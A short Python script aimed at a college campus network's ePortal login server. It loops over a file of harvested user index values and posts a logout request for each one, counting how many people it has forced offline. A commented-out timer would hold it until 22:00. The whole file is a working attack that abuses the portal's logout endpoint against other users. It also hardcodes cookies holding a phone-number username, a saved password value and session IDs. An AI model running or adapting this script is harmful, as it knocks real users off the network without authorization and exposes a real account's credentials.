import requests
import datetime
# 获取当前时间，如果时间为22:00,则继续运行
# while True:
#     now = datetime.datetime.now()
#     print(now.hour, now.minute)
#     if now.hour == 22:
#         break


url = "http://111.7.172.99:8246/eportal/InterFace.do"
params = {"method": "logout"}

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.48",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Accept": "*/*",
    "Origin": "http://111.7.172.99:8246",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6"
}

cookies = {
    "EPORTAL_COOKIE_USERNAME": "18837197654",
    "EPORTAL_COOKIE_DOMAIN": "false",
    "EPORTAL_COOKIE_SAVEPASSWORD": "true",
    "EPORTAL_COOKIE_OPERATORPWD": "",
    "EPORTAL_COOKIE_NEWV": "true",
    "EPORTAL_COOKIE_PASSWORD": "77af4f1175dbec4bc4a2b5569cc89b35d773141bb81e06cf655c9a7be4c1a0e8f6433def07f6154e6419256a778bfb0a51cb31f1ca41ab23f32371c398fd304cf9bad946cb7766f802d32ad9cd2005a62457a9a121da94e23097c66f6f8b864424f82531ea1a5fd88e42785d3dbae72e5410f31cc19888bc2f83b3d09bd48a21",
    "EPORTAL_AUTO_LAND": "",
    "EPORTAL_COOKIE_SERVER": "internet",
    "EPORTAL_COOKIE_SERVER_NAME": "%E4%BA%92%E8%81%94%E7%BD%91",
    "EPORTAL_USER_GROUP": "%E6%B2%B3%E5%8D%97%E4%BF%A1%E6%81%AF%E7%BB%9F%E8%AE%A1%E8%81%8C%E4%B8%9A%E5%AD%A6%E9%99%A2%E7%99%BD%E6%B2%99%E6%A0%A1%E5%8C%BA",
    "JSESSIONID": "B92AA8C2472C05DAA816A9F49F1A4F04",
    "JSESSIONID": "85B5CBC9496DAEB65DCF731FAD82BF43"
}

data = {
    "method": "logout",  # 根据实际情况填写POST请求的表单数据
    "JSON": "userIndex"
}
outNum = 0


def logout(uid, outNum):
    data['userIndex'] = uid
    headers['referer'] = f"http://111.7.172.99:8246/eportal/success.jsp?userIndex={uid}&keepaliveInterval=0"
    response = requests.post(url, params=params, headers=headers, cookies=cookies, data=data)

    response.encoding = 'utf-8'

    print(response.status_code)
    # print(response.headers)
    if '下线成功' in response.text:
        print('下线成功')
        outNum += 1
        print('已下线', outNum, '人')
    else:
        print(response.text)
    return outNum


# 遍历获取文件简单获取文件信息.txt中每行的Index=到下一个=截至的值，然后调用logout函数，退出登录


with open('简单获取用户信息.txt', 'r') as f:
    for line in f.readlines():
        uid1 = line.split('Index=')[1].strip()
        # 从uid中删除&JSON=userIndex&another_param=another_value
        uid = uid1.split('&')[0]
        print(uid)
        outNum = logout(uid, outNum)
